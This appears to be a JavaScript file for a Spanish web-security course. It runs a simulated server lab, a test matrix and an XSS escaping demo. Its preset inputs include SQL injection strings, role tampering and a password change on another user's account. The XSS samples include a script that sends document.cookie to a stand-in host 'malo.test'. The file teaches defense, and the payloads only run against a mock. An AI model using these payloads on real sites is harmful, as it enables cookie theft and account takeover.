/* ===== Desarrollo Web · Parcial II: interfaz (laboratorio, pruebas manuales, plantillas, fetch, diagnóstico) =====
   Requiere: web2-api.js, web2-datos.js, main.js y comunes.js (en ese orden). Datos externos → siempre con esc(). */
(function () {
  'use strict';
  const { $, $$, esc, store, pistas, codeBox } = window.Comunes;
  const API = window.Web2API, W = window.WEB2;
  const pretty = o => JSON.stringify(o, null, 2);
  const badgeEstado = s => `<span class="w2-st s${String(s)[0]}">${esc(s)}</span>`;
  const traza = t => `<ol class="w2-traza">${(t || []).map(x => `<li>${esc(x)}</li>`).join('')}</ol>`;

  /* ======================= LABORATORIO DE PETICIONES ======================= */
  function laboratorio(el) {
    if (!el) return;
    let modo = store.get('web2-lab-modo') || 'original', srv = API.crear(modo), sid = null, actual = 'visitante';
    const PRESETS = [
      ['Ver mi recurso', 'GET', '/recurso?id=1', ''],
      ['Ver el recurso de otra persona', 'GET', '/recurso?id=2', ''],
      ['Rol y acceso en la URL', 'GET', '/recurso?id=4&rol=admin&acceso=1', ''],
      ['Un id con SQL', 'GET', '/recurso?id=1 OR 1=1', ''],
      ['Login con datos raros', 'POST', '/login', '{ "email": "\' OR \'1\'=\'1", "password": "x" }'],
      ['Cambiar la contraseña de Bruno', 'POST', '/api/cambiar_password', '{ "user_id": 2, "current_password": "bruno12345", "new_password": "hackeada1", "csrf": "@csrf" }'],
      ['Cambiar mi contraseña (débil)', 'POST', '/api/cambiar_password', '{ "current_password": "ana12345", "new_password": "123", "csrf": "@csrf" }']
    ];
    el.innerHTML = `
      <div class="w2-bar">
        <div class="seg" role="group" aria-label="Versión del servidor">
          <button type="button" class="btn sec" data-modo="original">Servidor original (PHP del profe)</button>
          <button type="button" class="btn sec" data-modo="corregido">Servidor corregido</button>
        </div>
        <span class="small muted" data-w="quien"></span>
      </div>
      <div class="w2-bar"><span class="small"><b>Sesión:</b></span>
        <button type="button" class="btn sec" data-as="ana">Entrar como Ana (cliente)</button>
        <button type="button" class="btn sec" data-as="bruno">Entrar como Bruno (admin)</button>
        <button type="button" class="btn sec" data-as="carla">Carla (inactiva)</button>
        <button type="button" class="btn sec" data-as="">Cerrar sesión</button></div>
      <div class="chips" data-w="presets"></div>
      <div class="w2-req">
        <div class="w2-row"><label class="sr-only" for="w2m">Método</label><select id="w2m"><option>GET</option><option>POST</option><option>PUT</option><option>DELETE</option></select>
          <label class="sr-only" for="w2u">URL</label><input id="w2u" type="text" value="/recurso?id=1" spellcheck="false" autocomplete="off"><button type="button" class="btn" data-w="enviar">Enviar</button></div>
        <label class="small muted" for="w2b">Cuerpo JSON (solo POST). <code>@csrf</code> se reemplaza por el token de tu sesión.</label>
        <textarea id="w2b" class="reto-code w2-body" spellcheck="false" placeholder='{ "clave": "valor" }'></textarea>
      </div>
      <div data-w="salida" class="w2-out" aria-live="polite"><p class="muted small">Elige una petición de arriba o escribe la tuya y pulsa <b>Enviar</b>. Verás el status, la respuesta JSON y <b>qué comprobaciones hizo el servidor</b>.</p></div>
      <details class="qa"><summary>Ver la "base de datos" y las sesiones del simulador</summary><div class="ans" data-w="estado"></div></details>`;
    const q = s => $(`[data-w="${s}"]`, el);
    function pinta() {
      $$('[data-modo]', el).forEach(b => b.setAttribute('aria-pressed', String(b.dataset.modo === modo)));
      q('quien').textContent = 'Sesión actual: ' + actual;
      const e = srv.estado();
      q('estado').innerHTML = `<div class="tbl-wrap"><table><thead><tr><th>id</th><th>Nombre</th><th>Correo</th><th>Rol</th><th>Activo</th><th>Contraseña (inventada)</th></tr></thead><tbody>${e.usuarios.map(u => `<tr><td>${u.id}</td><td>${esc(u.nombre)}</td><td>${esc(u.email)}</td><td>${esc(u.rol)}</td><td>${u.activo}</td><td><code>${esc(u.pass)}</code></td></tr>`).join('')}</tbody></table></div>
        <p class="small muted">Recursos: 1 Manual de ventas (Ana) · 2 Plan anual de TI (Bruno) · 3 Borrador de política de TI (Bruno, borrador) · 4 Presupuesto reservado (Bruno, visible = 0). Los recursos 3 y 4 se agregaron para poder probar más casos. Sesiones abiertas: ${e.sesiones.length ? e.sesiones.map(s => `<code>${esc(s.sid)}</code> → cuenta ${s.user_id}`).join(', ') : 'ninguna'}.</p>`;
    }
    function nuevoServidor(m) { modo = m; store.set('web2-lab-modo', m); srv = API.crear(m); sid = null; actual = 'visitante'; pinta(); q('salida').innerHTML = '<p class="muted small">Servidor reiniciado en modo <b>' + esc(m) + '</b>: sin sesiones y con los datos de partida.</p>'; }
    function mostrar(req, r) {
      q('salida').innerHTML = `<div class="w2-resp"><div class="w2-line"><code>${esc(req.method)} ${esc(req.url)}</code> → ${badgeEstado(r.status)}${r.sid ? ' <span class="small muted">(el servidor entregó una cookie de sesión)</span>' : ''}</div>
        <pre class="code" data-hl="1">${esc(pretty(r.body))}</pre>
        <p class="small"><b>Qué hizo el servidor</b> (${esc(modo)}):</p>${traza(r.traza)}</div>`;
    }
    function enviar() {
      const method = $('#w2m', el).value, url = $('#w2u', el).value.trim();
      let body = null, texto = $('#w2b', el).value.trim();
      if (texto && method !== 'GET') {
        if (texto.includes('@csrf')) { const c = srv.handle({ method: 'GET', path: '/cuenta', sid }); texto = texto.replace(/@csrf/g, c.body && c.body.csrf ? c.body.csrf : 'sin-token'); }
        try { body = JSON.parse(texto); } catch (e) { q('salida').innerHTML = `<div class="verdict bad"><b>El cuerpo no es JSON válido.</b> ${esc(e.message)}</div>`; return; }
      }
      const u = srv.parseUrl(url);
      const r = srv.handle({ method, path: u.path, query: u.query, body, sid });
      if (r.sid) { sid = r.sid; const s = srv.estado().sesiones.find(x => x.sid === sid); const us = s && srv.estado().usuarios.find(x => x.id === s.user_id); actual = us ? us.nombre : actual; }
      mostrar({ method, url }, r); pinta();
    }
    q('presets').innerHTML = PRESETS.map((p, i) => `<button type="button" class="chip" data-p="${i}">${esc(p[0])}</button>`).join('');
    el.addEventListener('click', e => {
      const m = e.target.closest('[data-modo]'); if (m) { nuevoServidor(m.dataset.modo); return; }
      const p = e.target.closest('[data-p]'); if (p) { const d = PRESETS[+p.dataset.p]; $('#w2m', el).value = d[1]; $('#w2u', el).value = d[2]; $('#w2b', el).value = d[3]; return; }
      if (e.target.closest('[data-w="enviar"]')) { enviar(); return; }
      const a = e.target.closest('[data-as]');
      if (a) {
        if (!a.dataset.as) { sid = null; actual = 'visitante'; pinta(); q('salida').innerHTML = '<p class="muted small">Sesión cerrada: ahora eres un visitante.</p>'; return; }
        const u = srv.estado().usuarios.find(x => x.email.startsWith(a.dataset.as));
        const r = srv.handle({ method: 'POST', path: '/login', body: { email: u.email, password: u.pass } });
        if (r.sid) { sid = r.sid; actual = u.nombre; }
        mostrar({ method: 'POST', url: '/login (' + u.email + ')' }, r); pinta();
      }
    });
    $('#w2u', el).addEventListener('keydown', e => { if (e.key === 'Enter') enviar(); });
    pinta();
  }

  /* ======================= MATRIZ DE 14 PRUEBAS MANUALES ======================= */
  function matriz(el) {
    if (!el) return;
    const obs = {};
    const filas = () => API.PRUEBAS.map(p => {
      const o = obs[p.id];
      const cel = m => !o ? '<td class="mut">—</td>' : `<td>${badgeEstado(o[m].status)} <span class="${o[m].status === p.esperado[m] ? 'w2-ok' : 'w2-mal'}">${o[m].status === p.esperado[m] ? '✓' : '✗'}</span></td>`;
      return `<tr><td>${p.id}</td><td><b>${esc(p.nombre)}</b><br><span class="small muted">${esc(p.usuario)} · ${esc(p.manipulado)}</span></td>
        <td>${p.esperado.original}</td>${cel('original')}<td>${p.esperado.corregido}</td>${cel('corregido')}<td class="small">${esc(p.dato)}</td><td><button type="button" class="btn sec w2-mini" data-run="${p.id}">Ver traza</button></td></tr>
        <tr class="w2-det" data-det="${p.id}" hidden><td colspan="8">${o ? `<div class="grid g2"><div><p class="small"><b>Modo original</b></p>${traza(o.original.pasos.concat(o.original.traza))}</div><div><p class="small"><b>Modo corregido</b></p>${traza(o.corregido.pasos.concat(o.corregido.traza))}</div></div>` : ''}</td></tr>`;
    }).join('');
    function pinta() {
      const n = Object.keys(obs).length, difs = API.PRUEBAS.filter(p => p.esperado.original !== p.esperado.corregido).length;
      el.innerHTML = `<div class="reto-ctrl"><button type="button" class="btn" data-all>Ejecutar las 14 pruebas en ambos servidores</button>${n ? `<span class="small muted">Ejecutadas ${n} de ${API.PRUEBAS.length}.</span>` : ''}</div>
        <div class="tbl-wrap"><table class="w2-tabla"><thead><tr><th>#</th><th>Escenario</th><th>Esperado · original</th><th>Observado</th><th>Esperado · corregido</th><th>Observado</th><th>Dato confiable que decide</th><th></th></tr></thead><tbody>${filas()}</tbody></table></div>
        <p class="small muted">En <b>${difs}</b> de las 14 pruebas el servidor original y el corregido se comportan distinto: ahí están los defectos. ✓ = el status observado coincide con el esperado.</p>`;
    }
    el.addEventListener('click', e => {
      if (e.target.closest('[data-all]')) { API.PRUEBAS.forEach(p => { obs[p.id] = { original: API.ejecutarPrueba(p, 'original'), corregido: API.ejecutarPrueba(p, 'corregido') }; }); pinta(); return; }
      const b = e.target.closest('[data-run]'); if (!b) return;
      const p = API.PRUEBAS.find(x => x.id === +b.dataset.run); if (!obs[p.id]) { obs[p.id] = { original: API.ejecutarPrueba(p, 'original'), corregido: API.ejecutarPrueba(p, 'corregido') }; const abierto = p.id; pinta(); const d = $(`[data-det="${abierto}"]`, el); d.hidden = false; return; }
      const d = $(`[data-det="${p.id}"]`, el); d.hidden = !d.hidden;
    });
    pinta();
  }

  /* ======================= DEMO PLANTILLA → HTML (con y sin escape) ======================= */
  function demoPlantilla(el) {
    if (!el) return;
    const EJ = [
      ['Comentario normal', 'Buen manual, gracias'],
      ['<img onerror>', '<img src=x onerror=alert(document.cookie)>'],
      ['<script>', '<script>fetch("https://malo.test/?c=" + document.cookie)</script>'],
      ['Enlace javascript:', '<a href="javascript:robar()">Haz clic para ganar</a>'],
      ['Atributo con comillas', '" onmouseover="robar()" x="']
    ];
    el.innerHTML = `<div class="grid g2"><div><label class="small" for="w2t"><b>Plantilla</b> (los <code>{{huecos}}</code> se llenan con los datos)</label>
        <textarea id="w2t" class="reto-code w2-mini-ta" spellcheck="false">&lt;article&gt;&lt;h3&gt;{{autor}}&lt;/h3&gt;&lt;p class="c" title="{{comentario}}"&gt;{{comentario}}&lt;/p&gt;&lt;/article&gt;</textarea></div>
      <div><label class="small" for="w2d"><b>Dato que escribe el usuario</b> (comentario)</label><textarea id="w2d" class="reto-code w2-mini-ta" spellcheck="false">Buen manual, gracias</textarea>
        <div class="chips">${EJ.map((x, i) => `<button type="button" class="chip" data-ej="${i}">${esc(x[0])}</button>`).join('')}</div></div></div>
      <div class="grid g2" data-w="res"></div>`;
    const dec = s => { const t = document.createElement('textarea'); t.innerHTML = s; return t.value; };
    const render = (pl, datos, escapar) => pl.replace(/\{\{\s*([\w.]+)\s*\}\}/g, (_, k) => k in datos ? (escapar ? esc(datos[k]) : datos[k]) : '');
    /* Analiza (sin ejecutar nada) qué crearía el navegador: DOMParser produce un documento inerte. */
    function analiza(html) {
      const doc = new DOMParser().parseFromString(html, 'text/html'), riesgos = [];
      doc.querySelectorAll('*').forEach(n => {
        if (n.tagName === 'SCRIPT') riesgos.push('se crea un <script>: se ejecutaría al insertarlo en ciertos contextos y es la señal clásica de XSS');
        Array.from(n.attributes).forEach(a => {
          if (/^on/i.test(a.name)) riesgos.push(`<${n.tagName.toLowerCase()}> con el atributo ${a.name}="${a.value}": JavaScript que corre con el evento`);
          if (/^(href|src)$/i.test(a.name) && /^\s*javascript:/i.test(a.value)) riesgos.push(`<${n.tagName.toLowerCase()}> con ${a.name}="javascript:…": ejecuta código al hacer clic`);
        });
      });
      return { riesgos, nodos: Array.from(doc.body.querySelectorAll('*')).map(n => n.tagName.toLowerCase()) };
    }
    function pinta() {
      const pl = dec($('#w2t', el).value), datos = { autor: 'Ana', comentario: $('#w2d', el).value };
      const a = render(pl, datos, false), b = render(pl, datos, true), ra = analiza(a), rb = analiza(b);
      const panel = (titulo, ok, html, an, vista) => `<div class="card tile"><span class="tag">${titulo}</span>
        <p class="small"><b>HTML generado</b></p><pre class="code" data-hl="1">${esc(html)}</pre>
        <p class="small"><b>Qué interpreta el navegador:</b> ${an.nodos.length ? an.nodos.map(n => `<code>&lt;${esc(n)}&gt;</code>`).join(' ') : 'solo texto'}</p>
        ${an.riesgos.length ? `<div class="verdict bad"><b>⚠ Inyección</b><ul class="small">${an.riesgos.map(r => `<li>${esc(r)}</li>`).join('')}</ul></div>` : `<div class="verdict ok"><b>✓ Sin nada ejecutable.</b> Lo escrito se muestra como texto.</div>`}
        ${vista ? `<p class="small"><b>Vista:</b></p><div class="w2-vista">${html}</div>` : '<p class="small muted">(No se dibuja a propósito: insertar este HTML ejecutaría el ataque.)</p>'}</div>`;
      $('[data-w="res"]', el).innerHTML = panel('SIN ESCAPE · innerHTML', false, a, ra, false) + panel('CON ESCAPE · esc() / textContent', true, b, rb, true);
    }
    el.addEventListener('input', pinta);
    el.addEventListener('click', e => { const c = e.target.closest('[data-ej]'); if (c) { $('#w2d', el).value = EJ[+c.dataset.ej][1]; pinta(); } });
    pinta();
  }

  /* ======================= EJERCICIOS DE FETCH (Worker con timeout) ======================= */
  function ejecutarEnWorker(codigo, ej) {
    return new Promise(resolve => {
      let w, url;
      try {
        const src = window.crearWeb2API.toString() + '\n' + window.web2Correr.toString() + '\nonmessage=async e=>{try{postMessage(await web2Correr(e.data.codigo,e.data.ej,crearWeb2API));}catch(err){postMessage({resultados:[],consola:[],error:String(err&&err.message||err)});}};';
        url = URL.createObjectURL(new Blob([src], { type: 'text/javascript' })); w = new Worker(url);
      } catch (e) { resolve({ resultados: [], consola: [], error: 'Este navegador no permitió crear el Worker de pruebas: ' + e.message }); return; }
      const fin = r => { clearTimeout(t); w.terminate(); URL.revokeObjectURL(url); resolve(r); };
      const t = setTimeout(() => fin({ resultados: [], consola: [], error: 'Tiempo agotado (4 s): ¿ciclo infinito o una promesa que nunca se resuelve (falta un await o un return)?' }), 4000);
      w.onmessage = e => fin(e.data);
      w.onerror = e => fin({ resultados: [], consola: [], error: 'Error de sintaxis o de ejecución: ' + (e.message || 'revisa tu código') });
      w.postMessage({ codigo, ej: { exporta: ej.exporta, pruebas: ej.pruebasSrc } });
    });
  }
  function ejercicios(el) {
    if (!el) return;
    const hechos = store.get('web2-ej-ok') || {}; let cur = null;
    el.innerHTML = `<div class="reto-list" data-w="lista"></div><div class="reto-panel" data-w="panel" hidden></div>`;
    const lista = $('[data-w="lista"]', el), panel = $('[data-w="panel"]', el);
    const pintaLista = () => { lista.innerHTML = W.EJERCICIOS.map((e, i) => `<button type="button" class="reto-card" data-i="${i}" aria-pressed="${cur === i}"><span class="t">${i + 1}. ${esc(e.titulo)}</span><span class="m"><span class="chip">${esc(e.tema)}</span>${hechos[e.id] ? '<span class="best">✓ aprobado</span>' : ''}</span></button>`).join(''); };
    function abre(i) {
      cur = i; const e = W.EJERCICIOS[i]; pintaLista(); panel.hidden = false;
      panel.innerHTML = `<div class="reto-head"><h3>${i + 1}. ${esc(e.titulo)}</h3></div><p>${e.enunciado}</p>
        <label class="sr-only" for="w2c">Tu código</label><textarea id="w2c" class="reto-code" spellcheck="false">${esc(store.get('web2-ej-' + e.id) ?? e.inicial)}</textarea>
        <p class="reto-hint">Disponibles sin importar nada: <code>fetch</code> (simulado, sin red) y <code>esc()</code>. Se guarda solo en este navegador.</p>
        <div class="reto-ctrl"><button type="button" class="btn" data-a="run">▶ Ejecutar pruebas</button><button type="button" class="btn sec" data-a="sol">👀 Ver solución</button><button type="button" class="btn sec" data-a="reset">↺ Empezar de nuevo</button></div>
        <div data-w="pista"></div><div data-w="res"></div><div data-w="sol" hidden>${codeBox(e.solucion, 'solución.js')}</div>`;
      pistas($('[data-w="pista"]', panel), e.pistas);
    }
    lista.addEventListener('click', e => { const b = e.target.closest('[data-i]'); if (b) abre(+b.dataset.i); });
    panel.addEventListener('input', e => { if (e.target.id === 'w2c') store.set('web2-ej-' + W.EJERCICIOS[cur].id, e.target.value); });
    panel.addEventListener('click', async e => {
      const a = e.target.closest('[data-a]'); if (!a) return; const ej = W.EJERCICIOS[cur], res = $('[data-w="res"]', panel);
      if (a.dataset.a === 'sol') { const s = $('[data-w="sol"]', panel); s.hidden = !s.hidden; return; }
      if (a.dataset.a === 'reset') { if (!confirm('¿Borrar tu código y volver a la plantilla inicial?')) return; store.set('web2-ej-' + ej.id, ej.inicial); $('#w2c', panel).value = ej.inicial; res.innerHTML = ''; return; }
      a.disabled = true; res.innerHTML = '<p class="muted small">Ejecutando en un Worker aislado…</p>';
      const r = await ejecutarEnWorker($('#w2c', panel).value, ej); a.disabled = false;
      const ok = r.resultados.filter(x => x.ok).length, tot = r.resultados.length, todo = !r.error && tot > 0 && ok === tot;
      if (todo) { hechos[ej.id] = 1; store.set('web2-ej-ok', hechos); pintaLista(); }
      res.innerHTML = (r.error ? `<div class="verdict bad"><b>No se pudieron correr las pruebas</b><p class="small">${esc(r.error)}</p></div>` : `<div class="verdict ${todo ? 'ok' : ok ? 'warn' : 'bad'}"><b>${todo ? '¡Aprobado! ' : ''}${ok} de ${tot} pruebas</b></div>`)
        + `<ul class="reto-check">${r.resultados.map(x => `<li><label><span>${x.ok ? '✅' : '❌'} ${esc(x.n)}${x.ok ? '' : `<br><span class="small muted">${esc(x.d)}</span>`}</span></label></li>`).join('')}</ul>`
        + (r.consola && r.consola.length ? `<p class="small"><b>console.log:</b></p><pre class="code" data-hl="1">${esc(r.consola.join('\n'))}</pre>` : '');
    });
    pintaLista();
  }

  /* ======================= DIAGNÓSTICO (filtro por categoría) ======================= */
  function diagnostico(el) {
    if (!el) return;
    let cat = 'todas'; const SEV = { 3: ['alta', 'err'], 2: ['media', 'par'], 1: ['baja', 'ok'] };
    const cats = ['todas', ...Object.keys(W.CATS)];
    el.innerHTML = `<div class="assoc-bar"><span class="score" data-w="n"></span><span class="spacer"></span><div class="assoc-tabs" role="tablist">${cats.map(c => `<button type="button" role="tab" data-c="${c}" aria-selected="${c === cat}">${c === 'todas' ? 'Todas' : esc(W.CATS[c])}</button>`).join('')}</div></div><div class="grid g2" data-w="lista"></div>`;
    const pinta = () => {
      const l = W.DIAGNOSTICO.filter(d => cat === 'todas' || d.cat === cat);
      $('[data-w="n"]', el).textContent = l.length + ' de ' + W.DIAGNOSTICO.length + ' hallazgos';
      $('[data-w="lista"]', el).innerHTML = l.map(d => `<div class="card tile w2-hall"><span class="tag">${esc(W.CATS[d.cat].toUpperCase())}</span> <span class="w2-sev ${SEV[d.sev][1]}">severidad ${SEV[d.sev][0]}</span>${d.ded ? ' <span class="badge ded">deducido</span>' : ''}
        <p class="small mono w2-donde">${esc(d.donde)}</p><h4>${esc(d.hallazgo)}</h4><p class="small"><b>Impacto:</b> ${esc(d.impacto)}</p><p class="small"><b>Alternativa:</b> ${esc(d.alt)}</p></div>`).join('');
    };
    el.addEventListener('click', e => { const b = e.target.closest('[data-c]'); if (b) { cat = b.dataset.c; $$('[data-c]', el).forEach(x => x.setAttribute('aria-selected', String(x === b))); pinta(); } });
    pinta();
  }

  laboratorio($('#labApp')); matriz($('#matrizApp')); demoPlantilla($('#plantillaApp')); ejercicios($('#fetchApp')); diagnostico($('#diagApp'));
  window.Comunes.quiz('#quizApp', W.QUIZ);
  window.Comunes.abiertas('#abiertasApp', W.ABIERTAS, 'web2-abiertas');
})();
